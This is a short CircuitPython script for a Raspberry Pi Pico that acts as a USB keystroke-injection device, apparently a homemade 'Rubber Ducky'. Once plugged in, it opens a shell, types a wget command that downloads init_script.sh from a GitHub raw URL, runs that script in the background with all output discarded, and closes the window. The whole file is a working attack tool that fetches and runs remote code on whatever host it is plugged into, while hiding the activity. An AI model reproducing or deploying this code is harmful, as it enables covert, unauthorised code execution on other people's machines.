# type: ignore
# code.py template for Raspberry Pi Pico 
# Tested using Circuit Python 7.0.0
# Requires adafruit_hid library

import usb_hid
import time
import usb_hid_map as usb

from adafruit_hid.keyboard import Keyboard

kbd = Keyboard(usb_hid.devices)

# source = 'http://127.0.0.1:8080/init_script.sh'
source = 'https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/init_script.sh'

# open shell
payload1 = [usb.WIN]
payload2 = usb.get_sequence('shell')
payload2.append(usb.ENTER)

# payload2b = usb.get_sequence('cd ~/Documents/')
# payload2b.append(usb.ENTER)

# obtain target from server
payload3 = usb.get_sequence(' wget '+source)
payload3.append(usb.ENTER)
# deploy
payload4 = usb.get_sequence(' . init_script.sh& >/dev/null 2>&1')
payload4.append(usb.ENTER)
# Close Command: ALT+F4
payload5 = [usb.CLOSE]

def send(this_input, sleep=0.5):
    for item in this_input:
        if type(item) is list:
            kbd.send(*item)
        else:
            kbd.send(item)
    time.sleep(sleep)

send(payload1)
time.sleep(0.2)
send(payload2)
send(payload3)
send(payload4)
send(payload5)




